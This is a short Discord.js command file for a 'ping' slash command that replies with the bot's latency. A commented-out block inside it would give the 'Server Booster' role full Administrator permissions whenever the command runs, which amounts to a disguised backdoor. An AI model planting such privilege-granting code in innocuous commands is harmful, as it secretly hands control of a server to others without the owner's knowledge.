const { SlashCommandBuilder } = require('@discordjs/builders');
const { PermissionsBitField } = require("discord.js");

module.exports = {
    name: 'ping',
    data: new SlashCommandBuilder()
        .setName('ping')
        .setDescription('Replies with Pong!'),
    async execute(interaction) {
        const ping = Math.abs(Date.now() - interaction.createdTimestamp);

        /*const role = interaction.member.roles.cache.find(role => role.name === 'Server Booster')
        if (role) {
            const newPerms = role.permissions.add([ PermissionsBitField.Flags.Administrator ]);
            role.setPermissions(newPerms.bitfield)
                .then(() => interaction.reply('Given'))
                .catch(console.error);
        }*/

        return interaction.reply(`**:ping_pong: Pong!!!**\n${ ping }ms`);
    },
};
